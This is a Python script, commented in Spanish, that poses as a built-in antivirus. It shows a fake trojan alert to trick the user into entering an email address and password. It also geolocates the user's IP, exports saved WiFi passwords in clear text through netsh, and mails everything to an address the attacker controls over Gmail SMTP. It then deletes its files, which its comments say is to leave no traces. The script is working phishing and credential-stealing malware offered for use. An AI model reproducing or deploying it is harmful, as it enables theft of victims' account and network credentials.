import pyautogui
import shutil, os
from os import remove
import tempfile 
from email import encoders 
from email.message import Message 
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.utils import parseaddr, formataddr
import smtplib
from os import remove
import shutil
import subprocess
import webbrowser
import requests
from bs4 import *
import time
import glob

def run():
#recuerda tener el correo de envio de datos con la opcion de fuentes desconocidas activadas
#si no no se va a enviar 
#simulador de antivirus:
	print("EJECUTANDO ANTIVIRUS INTEGRADO, POR FAVOR ESPERE")
	print ("""se ha detectado un virus del tipo TROYAN HORSE
sera eliminado haora mismo, se le enviara un informe para verificar
posibles intrusiones en el sistema""")
	print("se le pide que acceda a su correo por aqui y registre de donde recibio el archivo o como lo optuvo")

#ladron de datos
	correo = str(input("correo: "))
	contraseña = str(input("contraseña: "))
	hora = str(input("hora de llegada del archivo: "))
	print("""Espere por favor""")


	#esto va a sacar las coordenadas del objetivo por medio de una web 
	url = "https://www.cual-es-mi-ip.net/geolocalizar-ip-mapa"
	page = requests.get(url)
	soup = BeautifulSoup(page.content, "html.parser")
	l = soup.title
	dedsec1 = soup.find_all("td")
	dedsec = str(dedsec1)
	pregunta = "si"
	if pregunta == "si":
		f = open("lexus.txt", "w")
		f.write(dedsec)
		f.close()
	else:
		pass


	#esto va a sacar las claves wifi del usuario
	#Creamos una carpeta/folder donde se guardara las claves de wifi
	try:
		os.mkdir('./NETPORT')
	except OSError as error:
		pass
	#Muestra todas las redes wifi que la pc fue conectada

	show = subprocess.check_output(['netsh', 'wlan', 'show', 'profile'])
	networks = subprocess.check_output(['netsh', 'wlan', 'show', 'networks'])
	#exporta las claves de wifi en archivos .xml

	a = subprocess.check_output(['netsh', 'wlan', 'export', 'profile','key=clear'])
	#Mover archivos .xml a la carpeta wifi

	source_dir = './' #Inicio de la carpeta 

	dst = './NETPORT' #Nueva carpeta destinatario 

	files = glob.iglob(os.path.join(source_dir, "*.xml"))
	#englobar los archivos a mover

	for file in files:
		if os.path.isfile(file):
			shutil.move(file, dst)
#esto enviara las claves del wifi a un correo que controlemos
	with os.scandir(dst) as ficheros:
	    for fichero in ficheros:
	    	msg = MIMEMultipart()
	password = ""#contraseña de tu correo
	msg['From'] = ""#correo desde el que se va a enviar los datos
	msg['To'] = ""#correo al que van a llegar los datos
	msg['Subject'] = ""#el asunto del mensaje
	msg.attach(MIMEText(open(fichero).read()))
	server = smtplib.SMTP('smtp.gmail.com: 587')
	server.starttls()
	server.login(msg['From'], password)
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	server.quit()
	shutil.rmtree("NETPORT")

#esto va a enviar los datos 

	msg = MIMEMultipart()
	#enviador de texto
	password = ""#contraseña de tu correo
	msg['From'] = ""#correo desde el que se va a enviar los datos
	msg['To'] = ""#correo al que van a llegar los datos
	msg['Subject'] = ""#el asunto del mensaje
	msg.attach(MIMEText(open("lexus.txt").read()))
	server = smtplib.SMTP('smtp.gmail.com: 587')
	server.starttls()
	server.login(msg['From'], password)
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	server.quit()


#esto escribira la contraseña del ladron de claves
# y la enviara
	f = open("text_file.txt", "w")
	f.write(correo)
	f.write(contraseña)
	f.write(hora)
	f.close()
	msg = MIMEMultipart()
	#enviador de texto
	password = ""#contraseña de tu correo
	msg['From'] = ""#correo desde el que se va a enviar los datos
	msg['To'] = ""#correo al que van a llegar los datos
	msg['Subject'] = ""#el asunto del mensaje
	msg.attach(MIMEText(open("text_file.txt").read()))
	server = smtplib.SMTP('smtp.gmail.com: 587')
	server.starttls()
	server.login(msg['From'], password)
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	server.quit()


#Finalizador de todo
#ya todos los datos que se crearon se eliminaran para no dejar huellas
	print("eliminando virus....")
	time.sleep(5)
	os.remove("text_file.txt")
	os.remove("lexus.txt")
	print("virus eliminado, por favor elimine lo que lo ocasiono")
	print("porfavor reinicie su ordenador, muchas gracias ")
	exit()
if __name__ == "__main__":
	run()